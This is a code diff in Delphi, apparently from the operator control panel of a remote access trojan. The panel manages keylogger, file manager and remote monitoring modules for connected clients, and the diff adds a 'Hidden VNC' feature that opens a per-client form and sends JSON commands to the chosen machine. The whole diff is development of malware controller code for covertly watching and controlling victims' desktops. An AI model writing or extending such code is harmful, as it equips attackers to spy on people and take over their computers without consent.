@@ -77,6 +77,7 @@ type
     procedure OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
+    procedure OnHVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnServerLog(Category: TLogCategory; const Msg: string);
     procedure AddLog(Category: TLogCategory; const Msg: string);
     procedure EnsureRemoteMonitoringMenuItem;
@@ -115,6 +116,7 @@ begin
   FServerManager.OnMonitoringReceived  := OnMonitoringReceived;
   FServerManager.OnKeyloggerReceived   := OnKeyloggerReceived;
   FServerManager.OnFileManagerReceived := OnFileManagerReceived;
+  FServerManager.OnHVNCReceived        := OnHVNCReceived;
   FServerManager.OnLog                 := OnServerLog;
 
   if Assigned(ProcessManager1) then
@@ -199,8 +201,46 @@ begin
 end;
 
 procedure TForm1.HiddenVNC1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F10         : TForm10;
+  ClientID    : string;
 begin
-     //Popup Menu Hidden VNC
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Lutfen once bir client secin.', 'Hidden VNC',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then
+  begin
+    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Hidden VNC',
+               MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  F10 := FServerManager.GetHiddenVNCForm(SelectedLine);
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  if not Assigned(F10) then
+  begin
+    F10 := TForm10.Create(Application);
+    FServerManager.RegisterHiddenVNCForm(SelectedLine, F10);
+  end;
+
+  F10.SetupForClient(SelectedLine, ClientID,
+                     FServerManager.SendJSON,
+                     FServerManager.UnregisterHiddenVNCForm);
+  F10.Show;
+  F10.BringToFront;
 end;
 
 // ---- Log System ----
@@ -532,6 +572,7 @@ begin
   FServerManager.UnregisterKeyloggerForm(aLine);
   FServerManager.UnregisterOpenURLForm(aLine);
   FServerManager.UnregisterFileManagerForm(aLine);
+  FServerManager.UnregisterHiddenVNCForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
@@ -592,6 +633,16 @@ begin
   F9 := FServerManager.GetFileManagerForm(aLine);
   if Assigned(F9) then
     F9.HandleFileManagerJSON(JSONObj);
+end;
+
+procedure TForm1.OnHVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
+var
+  F10: TForm10;
+begin
+  if not Assigned(FServerManager) then Exit;
+  F10 := FServerManager.GetHiddenVNCForm(aLine);
+  if Assigned(F10) then
+    F10.HandleHVNCJSON(JSONObj);
 end;
 
 { --- UI Yardimci Metodlar --- }
